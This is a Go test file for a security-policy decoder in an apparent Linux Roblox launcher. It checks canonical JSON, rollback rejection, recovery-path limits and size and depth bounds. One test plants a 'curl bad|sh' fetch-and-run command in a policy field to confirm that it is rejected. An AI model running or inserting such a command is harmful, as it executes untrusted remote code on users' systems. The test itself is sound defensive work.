package securitypolicy

import (
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"
)

var policyNow = time.Date(2030, 1, 2, 3, 4, 5, 0, time.UTC)

func canonical(t *testing.T, value any) []byte {
	t.Helper()
	data, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func validity(sequence uint64) Validity {
	return Validity{Sequence: sequence, NotBefore: policyNow.Add(-time.Hour).Format(time.RFC3339), Expires: policyNow.Add(time.Hour).Format(time.RFC3339)}
}

func TestDecodeRoblox(t *testing.T) {
	p := RobloxPolicy{
		Schema: "tipsy.roblox-policy.v1", Validity: validity(7), PackageName: "com.roblox.client",
		Platform: "android", Architecture: "x86_64", MinVersionCode: 100, MaxVersionCode: 200,
		AllowedSplits:  []string{"base", "config.x86_64"},
		SignerLineages: []SignerLineage{{ID: "roblox-main", SHA256: []string{strings.Repeat("1", 64)}, MinVersionCode: 100, MaxVersionCode: 200}},
	}
	if _, err := DecodeRoblox(canonical(t, p), policyNow, 7); err != nil {
		t.Fatal(err)
	}
	if _, err := DecodeRoblox(append(canonical(t, p), '\n'), policyNow, 7); code(err) != CodeNonCanonical {
		t.Fatalf("noncanonical code=%v err=%v", code(err), err)
	}
	p.Validity.Sequence = 6
	if _, err := DecodeRoblox(canonical(t, p), policyNow, 7); code(err) != CodeRollback {
		t.Fatalf("rollback code=%v err=%v", code(err), err)
	}
}

func TestDecodeRuntimeRejectsExecutableMeaning(t *testing.T) {
	p := RuntimePolicy{
		Schema: "tipsy.runtime-policy.v1", Validity: validity(1), MinimumTipsyVersion: "1.2.3",
		RequiredCapabilities: []string{"no-new-privs", "wx"},
		Selectors:            []RuntimeSelector{{ReleaseClass: "stable", RobloxClass: "authorized", KernelClass: "modern", BackendClass: "vulkan", ProfileID: "linux-strict-v1"}},
	}
	if _, err := DecodeRuntime(canonical(t, p), policyNow, 1); err != nil {
		t.Fatal(err)
	}
	data := strings.Replace(string(canonical(t, p)), `"minimum_tipsy_version"`, `"script":"curl bad|sh","minimum_tipsy_version"`, 1)
	if _, err := DecodeRuntime([]byte(data), policyNow, 1); code(err) != CodeMalformed {
		t.Fatalf("unknown executable field code=%v err=%v", code(err), err)
	}
	p.Selectors[0].ProfileID = "download-policy"
	if _, err := DecodeRuntime(canonical(t, p), policyNow, 1); code(err) != CodeProfileUnknown {
		t.Fatalf("profile code=%v err=%v", code(err), err)
	}
}

func TestDecodeRecoveryIsNarrow(t *testing.T) {
	p := RecoveryPolicy{
		Schema: "tipsy.recovery-policy.v1", Validity: Validity{Sequence: 9, NotBefore: policyNow.Add(-time.Hour).Format(time.RFC3339), Expires: policyNow.Add(24 * time.Hour).Format(time.RFC3339)}, Channel: "stable", AdvisoryID: "tsa-2030-1",
		Reason: "security_recall", SourceReleaseSequence: 20, TargetReleaseSequence: 19,
		TargetPath: "stable/linux/x86_64/artifact.AppImage", TargetLength: 12, TargetSHA256: strings.Repeat("a", 64),
	}
	if _, err := DecodeRecovery(canonical(t, p), policyNow, 9); err != nil {
		t.Fatal(err)
	}
	p.TargetPath = "beta/linux/x86_64/artifact.AppImage"
	if _, err := DecodeRecovery(canonical(t, p), policyNow, 9); code(err) != CodeUnsafeValue {
		t.Fatalf("path code=%v err=%v", code(err), err)
	}
	p.TargetPath = "stable/linux/x86_64/artifact.AppImage"
	p.Validity.Expires = policyNow.Add(8 * 24 * time.Hour).Format(time.RFC3339)
	if _, err := DecodeRecovery(canonical(t, p), policyNow, 9); code(err) != CodeUnsafeValue {
		t.Fatalf("long recovery code=%v err=%v", code(err), err)
	}
}

func TestPolicyBoundsAndDepth(t *testing.T) {
	if _, err := DecodeRuntime(make([]byte, MaxPolicyBytes+1), policyNow, 0); code(err) != CodeBounds {
		t.Fatalf("size code=%v err=%v", code(err), err)
	}
	deep := strings.Repeat("[", MaxJSONDepth+1) + strings.Repeat("]", MaxJSONDepth+1)
	if _, err := DecodeRuntime([]byte(deep), policyNow, 0); code(err) != CodeBounds {
		t.Fatalf("depth code=%v err=%v", code(err), err)
	}
}

func code(err error) Code {
	var policyErr *Error
	if errors.As(err, &policyErr) {
		return policyErr.Code
	}
	return ""
}
